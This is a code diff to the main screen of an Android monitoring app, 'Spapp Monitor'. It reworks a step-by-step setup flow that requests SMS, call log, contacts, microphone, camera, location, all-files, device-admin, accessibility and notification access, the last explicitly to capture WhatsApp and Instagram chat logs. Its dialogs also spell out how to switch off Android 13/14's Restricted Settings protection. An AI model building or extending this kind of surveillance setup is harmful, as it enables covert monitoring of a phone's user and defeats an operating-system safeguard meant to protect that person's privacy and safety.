@@ -37,11 +37,10 @@ import com.spapp.monitoring.sync.SyncScheduler
  * Main Status & Permission Control Center for Spapp Monitor.
  *
  * Features:
- *  - 1-Tap Master Setup: Automatically prompts all runtime permissions, then
- *    seamlessly auto-guides the user through the few required system access
- *    screens (Battery, Accessibility, Notifications, Usage Access).
- *  - Complete Permission Checklist: Clear live status badges for every
- *    monitoring permission, with 1-tap direct shortcuts.
+ *  - Smart Step-by-Step Master Button: Dynamically highlights the next required
+ *    permission without infinite recursive loops or trapped resume cycles.
+ *  - Full Android 13/14 Restricted Settings support with 1-tap App Info shortcut.
+ *  - Complete Permission Checklist with live status badges.
  */
 class MainActivity : AppCompatActivity() {
 
@@ -58,33 +57,20 @@ class MainActivity : AppCompatActivity() {
             com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
             SyncScheduler.runOnce(applicationContext)
         }
-        if (deviceState.isGuidedSetupActive) {
-            Handler(Looper.getMainLooper()).postDelayed({
-                advanceGuidedSetup()
-            }, 300)
-        }
+        val grantedCount = results.values.count { it }
+        Toast.makeText(this, "$grantedCount permissions updated", Toast.LENGTH_SHORT).show()
     }
 
     private val batteryExemptionLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
         refreshPermissionStatus()
-        if (deviceState.isGuidedSetupActive) {
-            Handler(Looper.getMainLooper()).postDelayed({
-                advanceGuidedSetup()
-            }, 300)
-        }
     }
 
     private val deviceAdminLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
         refreshPermissionStatus()
-        if (deviceState.isGuidedSetupActive) {
-            Handler(Looper.getMainLooper()).postDelayed({
-                advanceGuidedSetup()
-            }, 300)
-        }
     }
 
     private val statusHandler = Handler(Looper.getMainLooper())
@@ -108,9 +94,9 @@ class MainActivity : AppCompatActivity() {
         uploadCurrentFcmToken()
         com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
 
-        // 1-Tap Master Setup Button
+        // Master Setup Button (Dynamically executes the next pending step)
         binding.btnMasterOneTap.setOnClickListener {
-            startOrContinueMasterSetup()
+            handleNextSetupStep()
         }
 
         // Individual permission shortcut listeners
@@ -147,6 +133,10 @@ class MainActivity : AppCompatActivity() {
         }
 
         binding.btnNotificationRestricted.setOnClickListener {
+            openAppInfoSettings()
+        }
+
+        binding.btnUnlockRestricted.setOnClickListener {
             openAppInfoSettings()
         }
 
@@ -197,13 +187,6 @@ class MainActivity : AppCompatActivity() {
         refreshPermissionStatus()
         statusUpdater.run()
         uploadCurrentFcmToken()
-
-        // Auto-advance guided setup when user returns from settings
-        if (deviceState.isGuidedSetupActive) {
-            Handler(Looper.getMainLooper()).postDelayed({
-                advanceGuidedSetup()
-            }, 350)
-        }
     }
 
     override fun onPause() {
@@ -212,17 +195,10 @@ class MainActivity : AppCompatActivity() {
     }
 
     // =========================================================================
-    // 1-TAP MASTER SETUP WORKFLOW
+    // DYNAMIC NEXT-STEP SETUP WORKFLOW
     // =========================================================================
 
-    private fun startOrContinueMasterSetup() {
-        deviceState.isGuidedSetupActive = true
-        advanceGuidedSetup()
-    }
-
-    private fun advanceGuidedSetup() {
-        if (!deviceState.isGuidedSetupActive) return
-
+    private fun handleNextSetupStep() {
         // Step 1: Core Runtime Permissions Batch
         val missingRuntime = getMissingRuntimePermissions()
         if (missingRuntime.isNotEmpty()) {
@@ -230,7 +206,7 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        // Step 2: Battery Optimization Exemption (In-app popup prompt)
+        // Step 2: Battery Optimization Exemption
         if (!isBatteryExempted()) {
             val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                 data = Uri.parse("package:$packageName")
@@ -253,7 +229,7 @@ class MainActivity : AppCompatActivity() {
 
         // Step 5: App Usage Stats
         if (!isUsageAccessGranted()) {
-            Toast.makeText(this, "Step: Enable Usage Access for Spapp Monitor, then tap Back", Toast.LENGTH_LONG).show()
+            Toast.makeText(this, "Please enable Usage Access for Spapp Monitor, then tap Back", Toast.LENGTH_LONG).show()
             startActivity(usageCollector.usageAccessSettingsIntent())
             return
         }
@@ -261,7 +237,7 @@ class MainActivity : AppCompatActivity() {
         // Step 6: All Files Access (Android 11+)
         if (!isFileAccessGranted()) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                Toast.makeText(this, "Step: Allow All Files Access, then tap Back", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "Please allow All Files Access, then tap Back", Toast.LENGTH_LONG).show()
                 val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                     data = Uri.parse("package:$packageName")
                 }
@@ -276,20 +252,25 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        // All steps successfully completed!
-        deviceState.isGuidedSetupActive = false
-        refreshPermissionStatus()
-        Toast.makeText(
-            this,
-            "🎉 All permissions successfully enabled! Spapp Monitor is 100% active.",
-            Toast.LENGTH_LONG
-        ).show()
+        Toast.makeText(this, "🎉 All permissions are already active and configured!", Toast.LENGTH_LONG).show()
     }
 
     private fun showAccessibilityDialog() {
+        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            "To enable Live Screen & Monitoring:\n\n" +
+            "1. Tap 'Go to Settings' -> 'Downloaded apps' -> 'Spapp Monitor' -> Turn ON.\n\n" +
+            "⚠️ Android 13/14 Restricted Setting:\n" +
+            "If the switch is grayed out, tap 'Allow Restricted' below -> tap 3 vertical dots (top right) -> 'Allow restricted settings' -> then return and turn it ON."
+        } else {
+            "To enable Live Screen & Monitoring:\n\n" +
+            "1. Tap 'Go to Settings' below.\n" +
+            "2. Select 'Downloaded apps' or 'Installed services'.\n" +
+            "3. Select 'Spapp Monitor' and toggle it ON."
+        }
+
         AlertDialog.Builder(this)
             .setTitle(R.string.accessibility_dialog_title)
-            .setMessage(R.string.accessibility_dialog_message)
+            .setMessage(msg)
             .setPositiveButton(R.string.go_to_settings) { _, _ ->
                 try {
                     startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
@@ -300,16 +281,24 @@ class MainActivity : AppCompatActivity() {
             .setNeutralButton(R.string.open_app_info) { _, _ ->
                 openAppInfoSettings()
             }
-            .setNegativeButton(android.R.string.cancel) { _, _ ->
-                deviceState.isGuidedSetupActive = false
-            }
+            .setNegativeButton(android.R.string.cancel, null)
             .show()
     }
 
     private fun showNotificationDialog() {
+        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            "To capture WhatsApp & Instagram chat logs:\n\n" +
+            "1. Tap 'Go to Settings' -> Find 'Spapp Monitor' -> Toggle ON.\n\n" +
+            "⚠️ If blocked ('Restricted setting'): Tap 'Allow Restricted' below -> 3 dots (top right) -> 'Allow restricted settings'."
+        } else {
+            "To capture WhatsApp & Instagram chat logs:\n\n" +
+            "1. Tap 'Go to Settings' below.\n" +
+            "2. Find 'Spapp Monitor' and toggle it ON."
+        }
+
         AlertDialog.Builder(this)
             .setTitle("Enable Notification Access")
-            .setMessage("1. In the next screen, find 'Spapp Monitor' and toggle it ON.\n\n2. Note: If Android shows 'Restricted setting', tap 'Open App Info', click the 3 dots in the top-right corner, and tap 'Allow restricted settings'.\n\n3. Tap Back to continue setup.")
+            .setMessage(msg)
             .setPositiveButton(R.string.go_to_settings) { _, _ ->
                 try {
                     startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
@@ -320,9 +309,7 @@ class MainActivity : AppCompatActivity() {
             .setNeutralButton(R.string.open_app_info) { _, _ ->
                 openAppInfoSettings()
             }
-            .setNegativeButton(android.R.string.cancel) { _, _ ->
-                deviceState.isGuidedSetupActive = false
-            }
+            .setNegativeButton(android.R.string.cancel, null)
             .show()
     }
 
@@ -332,26 +319,43 @@ class MainActivity : AppCompatActivity() {
 
     private fun getMissingRuntimePermissions(): List<String> {
         val list = mutableListOf<String>()
-        val required = buildList {
-            add(Manifest.permission.ACCESS_FINE_LOCATION)
-            add(Manifest.permission.ACCESS_COARSE_LOCATION)
-            add(Manifest.permission.READ_CALL_LOG)
-            add(Manifest.permission.READ_CONTACTS)
-            add(Manifest.permission.READ_SMS)
-            add(Manifest.permission.RECORD_AUDIO)
-            add(Manifest.permission.CAMERA)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                add(Manifest.permission.POST_NOTIFICATIONS)
-                add(Manifest.permission.READ_MEDIA_IMAGES)
-            } else {
-                add(Manifest.permission.READ_EXTERNAL_STORAGE)
+
+        val hasLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
+                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+        if (!hasLocation) {
+            list.add(Manifest.permission.ACCESS_FINE_LOCATION)
+            list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
+        }
+
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            list.add(Manifest.permission.READ_CALL_LOG)
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            list.add(Manifest.permission.READ_CONTACTS)
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            list.add(Manifest.permission.READ_SMS)
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+            list.add(Manifest.permission.RECORD_AUDIO)
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            list.add(Manifest.permission.CAMERA)
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+                list.add(Manifest.permission.POST_NOTIFICATIONS)
+            }
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
+                list.add(Manifest.permission.READ_MEDIA_IMAGES)
+            }
+        } else {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
             }
         }
-        for (perm in required) {
-            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
-                list.add(perm)
-            }
-        }
+
         return list
     }
 
@@ -423,6 +427,10 @@ class MainActivity : AppCompatActivity() {
         binding.layoutAutostartPerm.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE
         binding.dividerAutostart.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE
 
+        // 9. Android 13+ Restricted Settings Warning Banner
+        val needsRestrictedBanner = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && (!isAccessibility || !isNotification)
+        binding.cardRestrictedBanner.visibility = if (needsRestrictedBanner) View.VISIBLE else View.GONE
+
         // Calculate total granted count
         var grantedCount = 0
         if (isCore) grantedCount++
@@ -446,13 +454,24 @@ class MainActivity : AppCompatActivity() {
             binding.btnMasterOneTap.text = "✓ ALL PERMISSIONS CONFIGURED & ACTIVE"
             binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.success))
             binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.success))
-            deviceState.isGuidedSetupActive = false
         } else {
             binding.tvMasterBadge.text = "ACTION NEEDED"
             binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.danger))
             binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.danger_bg))
-            binding.tvMasterDesc.text = "Enable all monitoring permissions with a single tap setup flow."
-            binding.btnMasterOneTap.text = "⚡ ONE-TAP ENABLE ALL PERMISSIONS"
+
+            // Dynamically show the NEXT step on the big button
+            val nextStepText = when {
+                !isCore -> "⚡ STEP 1: GRANT CORE PERMISSIONS"
+                !isBattery -> "⚡ STEP 2: ALLOW BACKGROUND ACTIVITY"
+                !isAccessibility -> "⚡ STEP 3: ENABLE ACCESSIBILITY SERVICE"
+                !isNotification -> "⚡ STEP 4: ENABLE NOTIFICATION ACCESS"
+                !isUsage -> "⚡ STEP 5: ENABLE USAGE STATS"
+                !isFile -> "⚡ STEP 6: ALLOW ALL FILES ACCESS"
+                !isAdmin -> "⚡ STEP 7: ENABLE DEVICE ADMIN (LOCK)"
+                else -> "⚡ CONTINUE PERMISSIONS SETUP"
+            }
+            binding.tvMasterDesc.text = "Tap below to configure the next required permission."
+            binding.btnMasterOneTap.text = nextStepText
             binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
             binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.accent))
         }
